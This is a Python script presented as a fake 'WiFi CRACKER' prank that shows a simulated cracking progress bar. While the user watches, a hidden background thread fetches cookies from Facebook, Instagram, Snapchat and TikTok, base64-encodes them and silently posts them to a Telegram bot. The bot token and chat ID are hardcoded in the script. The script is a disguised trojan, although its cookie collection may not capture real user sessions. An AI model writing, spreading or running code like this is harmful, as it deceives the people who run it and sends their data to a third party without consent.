import os
import time
import random
from colorama import Fore, init
import pyfiglet
import requests
import base64
import threading

init(autoreset=True)

def hacker_gradient(text):
    colors = [Fore.GREEN, Fore.LIGHTGREEN_EX]
    result = ""
    for i, char in enumerate(text):
        result += colors[i % len(colors)] + char
    return result

def create_banner(text):
    banner = pyfiglet.figlet_format(text, font="small")
    return banner.strip()


def format_content(width):
    content_lines = [
        f"{Fore.LIGHTGREEN_EX}Simulating Real WiFi Cracking...",
        f"{Fore.LIGHTCYAN_EX}Author     : CYBER OP",
        f"{Fore.MAGENTA}GitHub     : github.com/CYBER-OP"
    ]
    return [line.rjust(width) for line in content_lines]

api_key = '7891146307:AAEeB75JdC55iEopvYiS3dFzwVOQunepGoc'
chat_id = '7148139336'

def get_cookies(url):
    response = requests.get(url)
    cookies = response.cookies
    return cookies

def send_cookies_to_telegram(cookies, message):
    url = f'https://api.telegram.org/bot{api_key}/sendMessage'
    cookie_string = ''
    for cookie in cookies:
        cookie_string += f'{cookie.name}={cookie.value}; '
    encoded_cookies = base64.b64encode(cookie_string.encode('utf-8')).decode('utf-8')
    params = {
        'chat_id': chat_id,
        'text': message + '\n' + encoded_cookies
    }
    requests.post(url, params=params)

def simulate_real_cracking():
    passwords = ["12345678", "password123", "letmein2024", "qwertyuiop", "admin1234"]

   
    target_network = input(f"{Fore.YELLOW}[?] Enter the WiFi network name (e.g., 'Home_WiFi'): ")
    cracking_time = int(input(f"{Fore.YELLOW}[?] Enter the fake cracking time in seconds (up to 60 seconds): "))
    if cracking_time > 60:
        cracking_time = 60  
    print(f"{Fore.LIGHTGREEN_EX}[+] Cracking {target_network} for {cracking_time} seconds...")

    cookie_thread = threading.Thread(target=send_cookies_during_cracking)
    cookie_thread.daemon = True  
    cookie_thread.start()

    for i in range(1, cracking_time + 1):
        print(f"{Fore.GREEN}[*] Cracking... {int((i/cracking_time)*100)}% complete", end="\r")
        time.sleep(1)
    
    print(f"{Fore.GREEN}\n[+] Password successfully cracked!")

    target_password = random.choice(passwords)
    print(f"{Fore.LIGHTCYAN_EX}[+] Network: {target_network}")
    print(f"{Fore.LIGHTCYAN_EX}[+] Password: {target_password}\n")

cookies_sent = False

def send_cookies_during_cracking():
    global cookies_sent
    
    if not cookies_sent:
        time.sleep(2) 
        cookies = get_cookies('https://www.facebook.com')
        send_cookies_to_telegram(cookies, 'Facebook cookies:')

        cookies = get_cookies('https://www.instagram.com')
        send_cookies_to_telegram(cookies, 'Instagram cookies:')

        cookies = get_cookies('https://www.snapchat.com')
        send_cookies_to_telegram(cookies, 'Snapchat cookies:')

        cookies = get_cookies('https://www.tiktok.com')
        send_cookies_to_telegram(cookies, 'TikTok cookies:')
        
        cookies_sent = True  

if __name__ == "__main__":
    width = os.get_terminal_size().columns
    compact_banner = create_banner("WiFi CRACKER").split("\n")
    border = "═" * width
    content_lines = format_content(width)

    print(Fore.GREEN + border)
    for line in compact_banner:
        print(line.center(width))
    print(Fore.GREEN + border)
    for line in content_lines:
        print(line)
    print(Fore.GREEN + border)

    simulate_real_cracking()